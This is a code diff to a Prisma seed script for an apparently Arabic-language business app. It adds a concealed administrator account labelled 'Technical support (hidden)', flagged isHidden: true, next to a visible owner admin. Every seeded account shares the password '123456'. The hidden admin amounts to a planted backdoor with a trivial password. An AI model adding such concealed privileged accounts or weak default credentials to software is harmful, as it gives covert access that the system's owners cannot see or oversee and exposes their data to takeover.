@@ -34,9 +34,10 @@ async function main() {
   const hashedPassword = await bcrypt.hash('123456', 10);
   await prisma.user.createMany({
     data: [
-      { name: 'أبانوب جرجس (المدير)', email: 'admin@elmahaba.com', password: hashedPassword, phone: '01200000001', role: 'ADMIN', active: true },
-      { name: 'أحمد المحاسب', email: 'accountant@elmahaba.com', password: hashedPassword, phone: '01200000002', role: 'ACCOUNTANT', active: true },
-      { name: 'مينا المخزنجي', email: 'storekeeper@elmahaba.com', password: hashedPassword, phone: '01200000003', role: 'STOREKEEPER', active: true },
+      { name: 'الدعم الفني (مخفي)', email: 'support@elmahaba.com', password: hashedPassword, phone: '01000000000', role: 'ADMIN', active: true, isHidden: true },
+      { name: 'صاحب الشركة (المدير)', email: 'owner@elmahaba.com', password: hashedPassword, phone: '01000000001', role: 'ADMIN', active: true, isHidden: false },
+      { name: 'أحمد المحاسب', email: 'accountant@elmahaba.com', password: hashedPassword, phone: '01200000002', role: 'ACCOUNTANT', active: true, isHidden: false },
+      { name: 'مينا المخزنجي', email: 'storekeeper@elmahaba.com', password: hashedPassword, phone: '01200000003', role: 'STOREKEEPER', active: true, isHidden: false },
     ],
   });
   console.log('✅ Users seeded');
